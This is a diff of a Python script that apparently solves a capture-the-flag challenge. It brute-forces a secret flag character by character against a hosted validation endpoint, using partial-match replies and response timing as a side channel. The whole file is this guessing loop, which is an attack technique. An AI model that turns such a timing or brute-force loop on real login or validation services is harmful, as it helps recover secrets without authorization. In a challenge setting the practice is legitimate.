@@ -2,6 +2,7 @@ import requests
 import string
 import time
 
+# URL = "http://localhost:3000/api/validate"
 URL = "https://sofia-challenge.vercel.app/api/validate"
 
 # Simple charset
@@ -16,11 +17,12 @@ print("How it works: Correct characters cause delays!")
 print("="*60 + "\n")
 
 while True:
-    print(f"Current progress: {recovered}")
+    print(f"Current progress: '{recovered}'")
     print(f"Testing {len(CHARSET)} characters...\n")
     
     best_char = None
     best_time = 0
+    found_match = False
     
     for char in CHARSET:
         guess = recovered + char
@@ -35,20 +37,22 @@ while True:
             
             # Check response
             data = r.json()
-            if data.get("status") == "success":
+            status = data.get("status")
+            
+            if status == "success":
                 print(" ✓ FLAG FOUND!")
                 recovered += char
-                best_char = None
+                found_match = True
                 break
-            elif data.get("status") == "partial":
-                print(f" ✓ Partial match!")
+            elif status == "partial":
+                print(f" ✓ Correct character!")
                 recovered += char
-                best_char = None
+                found_match = True
                 break
             else:
                 print()
             
-            # Track slowest response
+            # Track slowest response (fallback if no partial/success)
             if elapsed > best_time:
                 best_time = elapsed
                 best_char = char
@@ -57,15 +61,35 @@ while True:
             print(f" ✗ Error: {e}")
             continue
     
-    # If we found the flag, stop
-    if best_char is None:
+    # Check if we found the complete flag
+    if found_match:
+        try:
+            # Verify if complete
+            r = requests.post(URL, json={"flag": recovered}, timeout=10)
+            if r.json().get("status") == "success":
+                print("\n" + "="*60)
+                print(f"🎉 COMPLETE FLAG: {recovered}")
+                print("="*60)
+                break
+            else:
+                # Partial match, continue to next character
+                print(f"\n→ Progress: {recovered} | Continuing...\n")
+                continue
+        except:
+            pass
+    
+    # If no match found, use timing-based guess
+    if not found_match and best_char:
+        recovered += best_char
+        print(f"\n→ Added '{best_char}' based on timing ({best_time:.3f}s)\n")
+    
+    # Safety check
+    if len(recovered) > 30:
+        print("\n[!] Max length reached")
         break
     
-    # Add the slowest character (most likely correct)
-    if best_char:
-        recovered += best_char
-        print(f"\n→ Added '{best_char}' (took {best_time:.3f}s)\n")
+    if not found_match and not best_char:
+        print("\n[!] No characters tested successfully")
+        break
 
-print("\n" + "="*60)
-print(f"🎉 FINAL FLAG: {recovered}")
-print("="*60)
+print(f"\nFinal result: {recovered}")
